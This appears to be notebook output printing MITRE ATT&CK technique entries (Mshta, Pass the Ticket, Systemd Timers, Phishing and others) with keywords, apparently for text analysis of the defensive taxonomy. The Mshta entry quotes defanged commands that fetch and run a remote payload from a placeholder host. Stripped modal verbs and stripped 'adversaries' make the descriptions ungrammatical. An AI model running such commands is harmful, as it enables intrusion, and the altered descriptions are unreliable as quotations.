       " 'T1098': {'name': 'Account Manipulation',\n",
       "  'description': 'manipulate accounts to maintain and/or elevate access to victim systems. Account manipulation consist of any action that preserves or modifies adversary access to a compromised account, such as modifying credentials or permission groups. These actions also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged Valid Accounts.',\n",
       "  'tactics': ['persistence', 'privilege-escalation'],\n",
       "  'keywords': ['account',\n",
       "   'accounts',\n",
       "   'access',\n",
       "   'manipulate',\n",
       "   'systems',\n",
       "   'manipulation',\n",
       "   'adversary',\n",
       "   'compromised',\n",
       "   'credentials',\n",
       "   'policies'],\n",
       "  'spacy_doc': manipulate accounts to maintain and/or elevate access to victim systems. Account manipulation consist of any action that preserves or modifies adversary access to a compromised account, such as modifying credentials or permission groups. These actions also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged Valid Accounts.},\n",
       " 'T1170': {'name': 'Mshta',\n",
       "  'description': 'Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). HTA files have the file extension .hta. HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. use mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code Files be executed by mshta.exe through an inline script: mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\")) They also be executed directly from URLs: mshta http[:]//webserver/payload[.]hta Mshta.exe be used to bypass application whitelisting solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer\\'s security context, it also bypasses browser security settings.',\n",
       "  'tactics': ['execution', 'defense-evasion'],\n",
       "  'keywords': ['files',\n",
       "   'utility',\n",
       "   'executes',\n",
       "   'applications',\n",
       "   'hta',\n",
       "   'internet',\n",
       "   'explorer',\n",
       "   'outside',\n",
       "   'browser',\n",
       "   'use'],\n",
       "  'spacy_doc': Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). HTA files have the file extension .hta. HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. use mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code Files be executed by mshta.exe through an inline script: mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\")) They also be executed directly from URLs: mshta http[:]//webserver/payload[.]hta Mshta.exe be used to bypass application whitelisting solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings.},\n",
       " 'T1048': {'name': 'Exfiltration Over Alternative Protocol',\n",
       "  'description': 'steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data also be sent to an alternate network location from the main command and control server. Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. also opt to encrypt and/or obfuscate these alternate channels. Exfiltration Over Alternative Protocol be done using various common operating system utilities such as Net/SMB or FTP. On macOS and Linux curl be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data from a system. Many IaaS and SaaS platforms (such as Microsoft Exchange, Microsoft SharePoint, GitHub, and AWS S3) support the direct download of files, emails, source code, and other sensitive information via the web console or Cloud API.',\n",
       "  'tactics': ['exfiltration'],\n",
       "  'keywords': ['data',\n",
       "   'protocol',\n",
       "   'command',\n",
       "   'control',\n",
       "   'alternate',\n",
       "   'ftp',\n",
       "   'channel',\n",
       "   'network',\n",
       "   'main',\n",
       "   'protocols'],\n",
       "  'spacy_doc': steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data also be sent to an alternate network location from the main command and control server. Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. also opt to encrypt and/or obfuscate these alternate channels. Exfiltration Over Alternative Protocol be done using various common operating system utilities such as Net/SMB or FTP. On macOS and Linux curl be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data from a system. Many IaaS and SaaS platforms (such as Microsoft Exchange, Microsoft SharePoint, GitHub, and AWS S3) support the direct download of files, emails, source code, and other sensitive information via the web console or Cloud API.},\n",
       " 'T1547.006': {'name': 'Kernel Modules and Extensions',\n",
       "  'description': 'modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. When used maliciously, LKMs be a type of kernel-mode Rootkit that run with the highest operating system privilege (Ring 0). Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors, and enabling root access to non-privileged users. Kernel extensions, also called kext, are used in macOS to load functionality onto a system similar to LKMs for Linux. Since the kernel is responsible for enforcing security and the kernel extensions run as apart of the kernel, kexts are not governed by macOS security policies. Kexts are loaded and unloaded through kextload and kextunload commands. Kexts need to be signed with a developer ID that is granted privileges by Apple allowing it to sign Kernel extensions. Developers without these privileges still sign kexts but they will not load unless SIP is disabled. If SIP is enabled, the kext signature is verified before being added to the AuxKC. Since macOS Catalina 10.15, kernel extensions have been deprecated in favor of System Extensions. However, kexts are still allowed as \"Legacy System Extensions\" since there is no System Extension for Kernel Programming Interfaces. use LKMs and kexts to conduct Persistence and/or Privilege Escalation on a system. Examples have been found in the wild, and there are some relevant open source projects as well.',\n",
       "  'tactics': ['persistence', 'privilege-escalation'],\n",
       "  'keywords': ['kernel',\n",
       "   'system',\n",
       "   'extensions',\n",
       "   'kexts',\n",
       "   'lkms',\n",
       "   'macos',\n",
       "   'loaded',\n",
       "   'unloaded',\n",
       "   'functionality',\n",
       "   'need'],\n",
       "  'spacy_doc': modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. When used maliciously, LKMs be a type of kernel-mode Rootkit that run with the highest operating system privilege (Ring 0). Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors, and enabling root access to non-privileged users. Kernel extensions, also called kext, are used in macOS to load functionality onto a system similar to LKMs for Linux. Since the kernel is responsible for enforcing security and the kernel extensions run as apart of the kernel, kexts are not governed by macOS security policies. Kexts are loaded and unloaded through kextload and kextunload commands. Kexts need to be signed with a developer ID that is granted privileges by Apple allowing it to sign Kernel extensions. Developers without these privileges still sign kexts but they will not load unless SIP is disabled. If SIP is enabled, the kext signature is verified before being added to the AuxKC. Since macOS Catalina 10.15, kernel extensions have been deprecated in favor of System Extensions. However, kexts are still allowed as \"Legacy System Extensions\" since there is no System Extension for Kernel Programming Interfaces. use LKMs and kexts to conduct Persistence and/or Privilege Escalation on a system. Examples have been found in the wild, and there are some relevant open source projects as well.},\n",
       " 'T1056.002': {'name': 'GUI Input Capture',\n",
       "  'description': 'mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: Bypass User Account Control). mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite. This type of prompt be used to collect credentials via various languages such as AppleScript and PowerShell. On Linux systems launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. Unix Shell). also mimic common software authentication requests, such as those from browsers or email clients. This also be paired with user activity monitoring (i.e., Browser Information Discovery and/or Application Window Discovery) to spoof prompts when users are naturally accessing sensitive sites/data.',\n",
       "  'tactics': ['collection', 'credential-access'],\n",
       "  'keywords': ['prompt',\n",
       "   'credentials',\n",
       "   'mimic',\n",
       "   'users',\n",
       "   'user',\n",
       "   'common',\n",
       "   'operating',\n",
       "   'system',\n",
       "   'seemingly',\n",
       "   'legitimate'],\n",
       "  'spacy_doc': mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: Bypass User Account Control). mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite. This type of prompt be used to collect credentials via various languages such as AppleScript and PowerShell. On Linux systems launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. Unix Shell). also mimic common software authentication requests, such as those from browsers or email clients. This also be paired with user activity monitoring (i.e., Browser Information Discovery and/or Application Window Discovery) to spoof prompts when users are naturally accessing sensitive sites/data.},\n",
       " 'T1097': {'name': 'Pass the Ticket',\n",
       "  'description': \"Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication be used as the first step to lateral movement to a remote system. In this technique, valid Kerberos tickets for Valid Accounts are captured by OS Credential Dumping. A user's service tickets or ticket granting ticket (TGT) be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access. Silver Tickets be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint). Golden Tickets be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.\",\n",
       "  'tactics': ['lateral-movement'],\n",
       "  'keywords': ['tickets',\n",
       "   'access',\n",
       "   'ticket',\n",
       "   'service',\n",
       "   'kerberos',\n",
       "   'account',\n",
       "   'resource',\n",
       "   'system',\n",
       "   'obtained',\n",
       "   'authentication'],\n",
       "  'spacy_doc': Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication be used as the first step to lateral movement to a remote system. In this technique, valid Kerberos tickets for Valid Accounts are captured by OS Credential Dumping. A user's service tickets or ticket granting ticket (TGT) be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access. Silver Tickets be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint). Golden Tickets be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.},\n",
       " 'T1588.002': {'name': 'Tool',\n",
       "  'description': 'buy, steal, or download software tools that be used during targeting. Tools be open or closed source, free or commercial. A tool be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: PsExec). Tool acquisition involve the procurement of commercial software licenses, including for red teaming tools such as Cobalt Strike. Commercial software be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions. obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, steal software and/or software licenses from third-party entities (including other ).',\n",
       "  'tactics': ['resource-development'],\n",
       "  'keywords': ['software',\n",
       "   'tools',\n",
       "   'commercial',\n",
       "   'licenses',\n",
       "   'including',\n",
       "   'steal',\n",
       "   'tool',\n",
       "   'purposes',\n",
       "   'support',\n",
       "   'buy'],\n",
       "  'spacy_doc': buy, steal, or download software tools that be used during targeting. Tools be open or closed source, free or commercial. A tool be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: PsExec). Tool acquisition involve the procurement of commercial software licenses, including for red teaming tools such as Cobalt Strike. Commercial software be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions. obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, steal software and/or software licenses from third-party entities (including other ).},\n",
       " 'T1052.001': {'name': 'Exfiltration over USB',\n",
       "  'description': 'attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration occur via a USB device introduced by a user. The USB device be used as the final exfiltration point or to hop between otherwise disconnected systems.',\n",
       "  'tactics': ['exfiltration'],\n",
       "  'keywords': ['usb',\n",
       "   'device',\n",
       "   'exfiltration',\n",
       "   'attempt',\n",
       "   'exfiltrate',\n",
       "   'data',\n",
       "   'connected',\n",
       "   'physical',\n",
       "   'certain',\n",
       "   'circumstances'],\n",
       "  'spacy_doc': attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration occur via a USB device introduced by a user. The USB device be used as the final exfiltration point or to hop between otherwise disconnected systems.},\n",
       " 'T1574.013': {'name': 'KernelCallbackTable',\n",
       "  'description': 'abuse the KernelCallbackTable of a process to hijack its execution flow in order to run their own payloads. The KernelCallbackTable be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once user32.dll is loaded. An adversary hijack the execution flow of a process using the KernelCallbackTable by replacing an original callback function with a malicious payload. Modifying callback functions be achieved in various ways involving related behaviors such as Reflective Code Loading or Process Injection into another process. A pointer to the memory address of the KernelCallbackTable be obtained by locating the PEB (ex: via a call to the NtQueryInformationProcess() Native API function). Once the pointer is located, the KernelCallbackTable be duplicated, and a function in the table (e.g., fnCOPYDATA) set to the address of a malicious payload (ex: via WriteProcessMemory()). The PEB is then updated with the new address of the table. Once the tampered function is invoked, the malicious payload will be triggered. The tampered function is typically invoked using a Windows message. After the process is hijacked and malicious code is executed, the KernelCallbackTable also be restored to its original state by the rest of the malicious payload. Use of the KernelCallbackTable to hijack execution flow evade detection from security products since the execution be masked under a legitimate process.',\n",
       "  'tactics': ['persistence', 'defense-evasion', 'privilege-escalation'],\n",
       "  'keywords': ['process',\n",
       "   'kernelcallbacktable',\n",
       "   'function',\n",
       "   'malicious',\n",
       "   'execution',\n",
       "   'payload',\n",
       "   'hijack',\n",
       "   'flow',\n",
       "   'peb',\n",
       "   'address'],\n",
       "  'spacy_doc': abuse the KernelCallbackTable of a process to hijack its execution flow in order to run their own payloads. The KernelCallbackTable be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once user32.dll is loaded. An adversary hijack the execution flow of a process using the KernelCallbackTable by replacing an original callback function with a malicious payload. Modifying callback functions be achieved in various ways involving related behaviors such as Reflective Code Loading or Process Injection into another process. A pointer to the memory address of the KernelCallbackTable be obtained by locating the PEB (ex: via a call to the NtQueryInformationProcess() Native API function). Once the pointer is located, the KernelCallbackTable be duplicated, and a function in the table (e.g., fnCOPYDATA) set to the address of a malicious payload (ex: via WriteProcessMemory()). The PEB is then updated with the new address of the table. Once the tampered function is invoked, the malicious payload will be triggered. The tampered function is typically invoked using a Windows message. After the process is hijacked and malicious code is executed, the KernelCallbackTable also be restored to its original state by the rest of the malicious payload. Use of the KernelCallbackTable to hijack execution flow evade detection from security products since the execution be masked under a legitimate process.},\n",
       " 'T1597': {'name': 'Search Closed Sources',\n",
       "  'description': 'search and gather information about victims from closed (e.g., paid, private, or otherwise not freely available) sources that be used during targeting. Information about victims be available for purchase from reputable private sources and databases, such as paid subscriptions to feeds of technical/threat intelligence data. also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets. search in different closed databases depending on what information they seek to gather. Information from these sources reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Valid Accounts).',\n",
       "  'tactics': ['reconnaissance'],\n",
       "  'keywords': ['information',\n",
       "   'sources',\n",
       "   'search',\n",
       "   'gather',\n",
       "   'victims',\n",
       "   'closed',\n",
       "   'paid',\n",
       "   'private',\n",
       "   'available',\n",
       "   'purchase'],\n",
       "  'spacy_doc': search and gather information about victims from closed (e.g., paid, private, or otherwise not freely available) sources that be used during targeting. Information about victims be available for purchase from reputable private sources and databases, such as paid subscriptions to feeds of technical/threat intelligence data. also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets. search in different closed databases depending on what information they seek to gather. Information from these sources reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Valid Accounts).},\n",
       " 'T1053.006': {'name': 'Systemd Timers',\n",
       "  'description': 'abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension .timer that control services. Timers be set to run on a calendar event or after a time span relative to a starting point. They be used as an alternative to Cron in Linux environments. Systemd timers be activated remotely via the systemctl command line utility, which operates over SSH. Each .timer file must have a corresponding .service file with the same name, e.g., example.timer and example.service. .service files are Systemd Service unit files that are managed by the systemd system and service manager. Privileged timers are written to /etc/systemd/system/ and /usr/lib/systemd/system while user level are written to ~/.config/systemd/user/. An adversary use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence. Timers installed using privileged paths be used to maintain root level persistence. also install user level timers to achieve user level persistence.',\n",
       "  'tactics': ['execution', 'persistence', 'privilege-escalation'],\n",
       "  'keywords': ['systemd',\n",
       "   'timers',\n",
       "   'level',\n",
       "   'files',\n",
       "   'file',\n",
       "   'system',\n",
       "   'user',\n",
       "   'persistence',\n",
       "   'malicious',\n",
       "   'code'],\n",
       "  'spacy_doc': abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension .timer that control services. Timers be set to run on a calendar event or after a time span relative to a starting point. They be used as an alternative to Cron in Linux environments. Systemd timers be activated remotely via the systemctl command line utility, which operates over SSH. Each .timer file must have a corresponding .service file with the same name, e.g., example.timer and example.service. .service files are Systemd Service unit files that are managed by the systemd system and service manager. Privileged timers are written to /etc/systemd/system/ and /usr/lib/systemd/system while user level are written to ~/.config/systemd/user/. An adversary use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence. Timers installed using privileged paths be used to maintain root level persistence. also install user level timers to achieve user level persistence.},\n",
       " 'T1566': {'name': 'Phishing',\n",
       "  'description': 'send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, conduct non-targeted phishing, such as in mass malware spam campaigns. send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing also be conducted via third-party services, like social media platforms. Phishing also involve social engineering techniques, such as posing as a trusted source, as well as evasive techniques such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., Email Hiding Rules). Another way to accomplish this is by forging or spoofing the identity of the sender which be used to fool both the human recipient as well as automated security tools, or by including the intended target as a party to an existing email thread that includes malicious files or links (i.e., \"thread hijacking\"). Victims also receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware, or install adversary-accessible remote management tools onto their computer (i.e., User Execution).',\n",
       "  'tactics': ['initial-access'],\n",
       "  'keywords': ['phishing',\n",
       "   'malicious',\n",
       "   'send',\n",
       "   'messages',\n",
       "   'social',\n",
       "   'targeted',\n",
       "   'victim',\n",
       "   'systems',\n",
       "   'engineering',\n",
       "   'spearphishing'],\n",
       "  'spacy_doc': send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, conduct non-targeted phishing, such as in mass malware spam campaigns. send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing also be conducted via third-party services, like social media platforms. Phishing also involve social engineering techniques, such as posing as a trusted source, as well as evasive techniques such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., Email Hiding Rules). Another way to accomplish this is by forging or spoofing the identity of the sender which be used to fool both the human recipient as well as automated security tools, or by including the intended target as a party to an existing email thread that includes malicious files or links (i.e., \"thread hijacking\"). Victims also receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware, or install adversary-accessible remote management tools onto their computer (i.e., User Execution).},\n",
       " 'T1061': {'name': 'Graphical User Interface',\n",
       "  'description': \"**This technique has been deprecated. Please use Remote Services where appropriate.** The Graphical User Interfaces (GUI) is a common way to interact with an operating system. use a system's GUI during an operation, commonly through a remote interactive session such as Remote Desktop Protocol, instead of through a Command and Scripting Interpreter, to search for information and execute files via mouse double-click events, the Windows Run command , or other potentially difficult to monitor interactions.\",\n",
